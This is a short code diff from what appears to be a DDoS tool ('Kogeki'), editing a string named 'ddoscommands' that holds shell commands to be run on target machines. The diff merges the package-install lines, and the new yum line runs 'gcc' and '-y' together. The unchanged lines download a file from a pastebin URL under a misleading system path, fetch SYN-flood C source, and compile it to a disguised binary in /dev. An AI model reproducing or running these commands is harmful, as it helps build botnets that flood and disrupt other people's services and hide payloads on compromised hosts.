@@ -148,18 +148,8 @@ Kogeki Rules
 ''')
 global ddoscommands
 ddoscommands = str('''
-apt-get install python3 -y
-apt-get install nohup -y
-apt-get install python3-pip -y
-apt-get install python -y
-apt-get install python-pip -y
-apt-get install gcc -y
-yum install python3 -y
-yum install nohup -y
-yum install python3-pip -y
-yum install python -y
-yum install python-pip -y
-yum install gcc -y
+apt-get install python3 nohup python3-pip python python-pip gcc -y
+yum install python3 nohup python3-pip python python-pip gcc-y
 wget https://pastebin.com/raw/b61eqYxw -O /usr/share/adduser/users.log
 wget https://raw.githubusercontent.com/cyberhubarchive/archive/master/Stress%20Testing/TCP/syn.c -O /dev/nuii.c
 gcc /dev/nuii.c -o /dev/noll -pthread
